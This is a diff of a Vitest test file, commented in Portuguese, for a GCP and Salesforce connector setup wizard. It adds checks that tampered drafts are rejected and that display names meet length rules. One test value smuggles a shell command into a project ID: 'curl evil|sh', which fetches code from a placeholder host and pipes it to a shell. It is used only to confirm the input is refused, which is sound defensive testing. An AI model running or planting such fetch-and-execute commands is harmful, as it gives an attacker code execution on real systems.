@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import {
-  buildGcpConfig, buildSalesforceConfig, EMPTY_GCP, EMPTY_SALESFORCE, gcloudCommands, probeSalesforceConfig, readGcpDraft, validField,
+  buildGcpConfig, buildSalesforceConfig, validName, EMPTY_GCP, EMPTY_SALESFORCE, gcloudCommands, probeSalesforceConfig, readGcpDraft, validField,
   validObject, validProject,
 } from "./wizard";
 
@@ -26,6 +26,18 @@ describe("assistente de Conector", () => {
     expect(readGcpDraft(JSON.stringify({ ...saved, project_id: 7 }))).toEqual(EMPTY_GCP);
     expect(readGcpDraft("{")).toEqual(EMPTY_GCP);
     expect(readGcpDraft(null)).toEqual(EMPTY_GCP);
+    // Projeto inválido (rascunho mexido na aba) ou intervalo fora das opções: recomeça.
+    expect(readGcpDraft(JSON.stringify({ ...saved, project_id: "x; curl evil|sh" }))).toEqual(EMPTY_GCP);
+    expect(readGcpDraft(JSON.stringify({ ...saved, sync_interval_seconds: 7 }))).toEqual(EMPTY_GCP);
+    // Projeto vazio só no passo 1.
+    expect(readGcpDraft(JSON.stringify({ ...EMPTY_GCP, step: 1 }))).toEqual(EMPTY_GCP);
+    expect(readGcpDraft(JSON.stringify({ ...EMPTY_GCP, step: 2 }))).toEqual(EMPTY_GCP);
+  });
+
+  it("o nome é opcional; preenchido, com 2 a 80 caracteres sem contar os espaços", () => {
+    expect(validName("")).toBe(true);
+    expect(validName(" a ")).toBe(false);
+    expect(validName("Cloud Logging")).toBe(true);
   });
 
   it("os comandos dão à Service Account só leitura de logs", () => {
